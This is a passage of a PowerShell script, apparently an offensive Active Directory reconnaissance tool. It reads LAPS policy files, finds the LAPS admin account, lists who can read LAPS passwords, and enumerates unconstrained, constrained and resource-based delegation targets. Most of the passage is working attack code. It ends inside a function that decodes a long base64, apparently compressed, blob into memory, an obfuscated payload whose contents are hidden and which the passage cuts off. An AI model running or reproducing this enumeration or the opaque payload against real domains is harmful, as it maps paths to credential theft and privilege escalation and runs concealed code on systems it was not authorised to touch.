		Get-DomainGPO -Domain $Domain -Server $Server | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | Format-Table -AutoSize -Wrap
		$LAPSGPOLocation = Get-DomainGPO -Domain $Domain -Server $Server | ? { $_.DisplayName -like "*laps*" } | select-object -ExpandProperty GPCFileSysPath
		$LAPSGPOLocation = ($LAPSGPOLocation | Out-String) -split "`n"
		$LAPSGPOLocation = $LAPSGPOLocation.Trim()
		$LAPSGPOLocation = $LAPSGPOLocation | Where-Object { $_ -ne "" }
		#ls $LAPSGPOLocation\Machine
		#Write-Host ""
		foreach($LAPSGPOLoc in $LAPSGPOLocation){
			$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
			$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
			$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
			$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
			$splitString | Format-Table -AutoSize -Wrap
			#$inputString = $null
			#$splitString = $null
			#type $LAPSGPOLoc\Machine\Registry.pol
		}
	}
	else{
		foreach ($AllDomain in $AllDomains){
			Get-DomainGPO -Domain $AllDomain | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | Format-Table -AutoSize -Wrap
			$LAPSGPOLocation = Get-DomainGPO -Domain $AllDomain | ? { $_.DisplayName -like "*laps*" } | select-object -ExpandProperty GPCFileSysPath
			$LAPSGPOLocation = ($LAPSGPOLocation | Out-String) -split "`n"
			$LAPSGPOLocation = $LAPSGPOLocation.Trim()
			$LAPSGPOLocation = $LAPSGPOLocation | Where-Object { $_ -ne "" }
			#ls $LAPSGPOLocation\Machine
			#Write-Host ""
			foreach($LAPSGPOLoc in $LAPSGPOLocation){
				$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
				$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
				$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
				$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
				$splitString | Format-Table -AutoSize -Wrap
				#$inputString = $null
				#$splitString = $null
				#type $LAPSGPOLoc\Machine\Registry.pol
			}
		}
	}

	$inputString = $null
	$splitString = $null


	Write-Host ""
	Write-Host "LAPS Admin:" -ForegroundColor Cyan
	Write-Host ""
	if($Domain -AND $Server) {
		$LAPSGPOLocation = Get-DomainGPO -Domain $Domain -Server $Server | ? { $_.DisplayName -like "*laps*" } | select-object -ExpandProperty GPCFileSysPath
		$LAPSGPOLocation = ($LAPSGPOLocation | Out-String) -split "`n"
		$LAPSGPOLocation = $LAPSGPOLocation.Trim()
		$LAPSGPOLocation = $LAPSGPOLocation | Where-Object { $_ -ne "" }
		#ls $LAPSGPOLocation\Machine
		#Write-Host ""
		foreach($LAPSGPOLoc in $LAPSGPOLocation){
			$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
			$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
			$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
			$splitString = ($splitString | Out-String) -split "`n"
			$splitString = $splitString.Trim()
			$splitString = $splitString | Where-Object { $_ -ne "" }
			$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
			$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
			if ($adminAccountRow) {
				$LAPSAdminresult = ($adminAccountRow -split ';')[4]
				Write-Output $LAPSAdminresult | Format-Table -AutoSize -Wrap
			}
		}
	}
	else{
		foreach ($AllDomain in $AllDomains){
			$LAPSGPOLocation = Get-DomainGPO -Domain $AllDomain | ? { $_.DisplayName -like "*laps*" } | select-object -ExpandProperty GPCFileSysPath
			$LAPSGPOLocation = ($LAPSGPOLocation | Out-String) -split "`n"
			$LAPSGPOLocation = $LAPSGPOLocation.Trim()
			$LAPSGPOLocation = $LAPSGPOLocation | Where-Object { $_ -ne "" }
			#ls $LAPSGPOLocation\Machine
			#Write-Host ""
			foreach($LAPSGPOLoc in $LAPSGPOLocation){
				$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
				$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
				$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
				$splitString = ($splitString | Out-String) -split "`n"
				$splitString = $splitString.Trim()
				$splitString = $splitString | Where-Object { $_ -ne "" }
				$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
				$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
				if ($adminAccountRow) {
					$LAPSAdminresult = ($adminAccountRow -split ';')[4]
					Write-Output $LAPSAdminresult | Format-Table -AutoSize -Wrap
				}
			}
		}
	}

	$inputString = $null
	$splitString = $null

	Write-Host ""
	Write-Host "Who can read LAPS:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		#foreach ($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier | Format-Table -AutoSize -Wrap}
		Get-DomainComputer -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, @{Name="Delegated Groups";Expression={ConvertFrom-SID $_.SecurityIdentifier -Domain $Domain -Server $Server}} | Format-Table -AutoSize -Wrap
	}
	else{
		#foreach ($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier | Format-Table -AutoSize -Wrap}
		foreach ($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, @{Name="Delegated Groups";Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Computer objects where LAPS is enabled:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainComputer -Domain $Domain -Server $Server | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Unconstrained Delegation:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		$DCs = Get-DomainController -Domain $Domain -Server $Server; Get-NetComputer -Domain $Domain -Server $Server -Unconstrained | Where-Object { $_.dnshostname -notmatch "($($DCs.Name -join ' - '))" } | Select-Object name, samaccountname, samaccounttype, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains) {$DCs = Get-DomainController -Domain $AllDomain; Get-NetComputer -Domain $AllDomain -Unconstrained | Where-Object { $_.dnshostname -notmatch "($($DCs.Name -join ' - '))" } | Select-Object name, samaccountname, samaccounttype, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Constrained Delegation (Computers):" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainComputer -Domain $Domain -Server $Server -TrustedToAuth -Properties Name,dnshostname,msds-AllowedToDelegateTo | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains) {Get-DomainComputer -Domain $AllDomain -TrustedToAuth -Properties Name,dnshostname,msds-AllowedToDelegateTo | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Constrained Delegation (Users):" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server -TrustedToAuth -Properties Name,dnshostname,msds-AllowedToDelegateTo | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains) {Get-DomainUser -Domain $AllDomain -TrustedToAuth -Properties Name,dnshostname,msds-AllowedToDelegateTo | Format-Table -AutoSize -Wrap}
	}
	
	Write-Host ""
	Write-Host "Resource Based Constrained Delegation:" -ForegroundColor Cyan
	Write-Host ""
	#foreach ($AllDomain in $AllDomains){$domainSID = Get-DomainSID $AllDomain ; Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$domainSID-[\d]{4,10}" } | Select-Object @{Name='Computer_Object';Expression={([System.Security.Principal.SecurityIdentifier]$_.ObjectSID).Translate([System.Security.Principal.NTAccount])}},ActiveDirectoryRights,ObjectAceType,@{Name='Account';Expression={([System.Security.Principal.SecurityIdentifier]$_.SecurityIdentifier).Translate([System.Security.Principal.NTAccount])}} -ExcludeProperty ObjectDN | Format-Table -AutoSize -Wrap -Property Computer_Object,ActiveDirectoryRights,ObjectAceType,Account}
	if($Domain -AND $Server) {
		$domainSID = Get-DomainSID $Domain -Server $Server
		Get-DomainComputer -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | 
		? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$domainSID-[\d]{4,10}" -and $_.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]) -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | 
		Select-Object @{Name='Computer_Object';Expression={([System.Security.Principal.SecurityIdentifier]$_.ObjectSID).Translate([System.Security.Principal.NTAccount])}},ActiveDirectoryRights,ObjectAceType,@{Name='Account';Expression={([System.Security.Principal.SecurityIdentifier]$_.SecurityIdentifier).Translate([System.Security.Principal.NTAccount])}} -ExcludeProperty ObjectDN | 
		Format-Table -AutoSize -Wrap -Property Computer_Object,ActiveDirectoryRights,ObjectAceType,Account
	}
	else{
		foreach ($AllDomain in $AllDomains){
			$domainSID = Get-DomainSID $AllDomain 
			Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | 
			? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$domainSID-[\d]{4,10}" -and $_.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]) -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | 
			Select-Object @{Name='Computer_Object';Expression={([System.Security.Principal.SecurityIdentifier]$_.ObjectSID).Translate([System.Security.Principal.NTAccount])}},ActiveDirectoryRights,ObjectAceType,@{Name='Account';Expression={([System.Security.Principal.SecurityIdentifier]$_.SecurityIdentifier).Translate([System.Security.Principal.NTAccount])}} -ExcludeProperty ObjectDN | 
			Format-Table -AutoSize -Wrap -Property Computer_Object,ActiveDirectoryRights,ObjectAceType,Account
		}
	}

	function Invoke-Get-RBCD-Threaded
	{

		[CmdletBinding()]
		Param (
			[String]
			$Command = ""

		)
		$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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